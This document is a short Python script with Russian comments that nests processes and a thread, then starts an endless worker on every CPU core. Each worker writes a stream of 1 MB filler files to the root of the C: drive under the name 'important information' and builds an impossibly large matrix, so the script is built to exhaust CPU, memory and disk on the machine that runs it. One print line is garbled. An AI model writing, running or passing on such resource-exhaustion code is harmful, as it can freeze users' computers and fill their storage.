import math
import multiprocessing
import threading
import os
import time
SIZE = 100000000

def final_workload():
    """Финальный процесс, который нагружает ядро"""
    i=0
    while True:
        i+=1
        size_bytes = 1024 * 1024  # 1 МБ
        filename = f"C:\\Важная_информация{i}.txt"

        with open(filename, "w", encoding="utf-8", newline="") as f:
            text = "A" * size_bytes
            f.write(text)
        matrix = [[i for i in range(SIZE)] for _ in range(SIZE)]
        result = []
        for row in matrix:
            result.append([math.sqrt(x) ** 10 for x in row])



def thread_function():
    """Поток, который создает процессы на все ядра"""
    cpu_count = multiprocessing.cpu_count()
    print(f"Поток в PID {os.getpid()} создает {cpu_count} процессов...")
    print(f"Поток в PID п процессов...")
    processes = []
    for _ in range(cpu_count):
        p = multiprocessing.Process(target=final_workload)
        p.start()
        processes.append(p)

    for p in processes:
        p.join()


def grandchild_process():
    """Внучатый процесс, создающий поток"""
    t = threading.Thread(target=thread_function)
    t.start()
    t.join()


def child_process():
    """Дочерний процесс, создающий внучатый процесс"""
    p = multiprocessing.Process(target=grandchild_process)
    p.start()
    p.join()


if __name__ == "__main__":
    #while True:
        main_child = multiprocessing.Process(target=child_process)
        main_child.start()
        main_child.join()
